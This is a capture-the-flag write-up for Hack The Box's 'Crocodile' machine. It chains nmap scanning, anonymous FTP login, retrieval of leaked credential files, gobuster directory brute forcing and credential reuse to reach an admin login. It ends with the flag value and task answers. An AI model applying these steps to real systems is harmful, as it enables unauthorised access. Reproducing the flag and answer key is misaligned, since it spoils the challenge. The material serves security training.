# 📘 Hack The Box: Crocodile

> 🔗 https://app.hackthebox.com/machines/Crocodile

---

## 🎯 Goal
Gain access by chaining simple vulnerabilities:
1. Discover services
2. Find leaked data
3. Reuse credentials

---

## 🧠 Big Picture

```text
Scan → FTP → Download files → Extract creds → Find login → Access → Flag
```

---

## 🔍 Step 1 — Scan

```bash
nmap -sC -sV <TARGET_IP>
```

### What it does:
- `-sC` → default scripts
- `-sV` → version detection

---

### Result:
```
21/tcp open ftp
80/tcp open http
```

---

### Thinking:
- FTP → files?
- Web → login?

---

## 🔍 Step 2 — FTP Access

```bash
ftp <TARGET_IP>
```

Login:
```
anonymous
```

---

### Why it works:
Misconfigured FTP → allows anonymous login

---

## 📥 Step 3 — Download files

```bash
get allowed.userlist
get allowed.userlist.passwd
```

---

## 🔍 Step 4 — Analyze

```bash
cat files
```

---

### You get:
Usernames + passwords

---

### Thinking:
```text
Can I reuse these credentials?
```

---

## 🔍 Step 5 — Find login page

```bash
gobuster dir -u http://<TARGET_IP> -w wordlist -x php,html
```

---

### Result:
```
/login.php
```

---

## 🔐 Step 6 — Login

Try:
```
admin : password
```

---

### Why it works:
Credential reuse

---

## 🏁 Step 7 — Flag

Login → flag shown

---

## 🔐 Flag
<details><summary>Show</summary>

c7110277ac44d78b6a9fff2232434d16

</details>

---

## 📋 Task answers
<details><summary>Показать</summary>

-sC  
vsftpd 3.0.3  
230  
anonymous  
get  
admin  
Apache httpd 2.4.41  
-x  
login.php  

</details>

---

## 🧠 What you learned

- service enumeration
- FTP exploitation
- data leakage
- credential reuse
- directory brute force

---
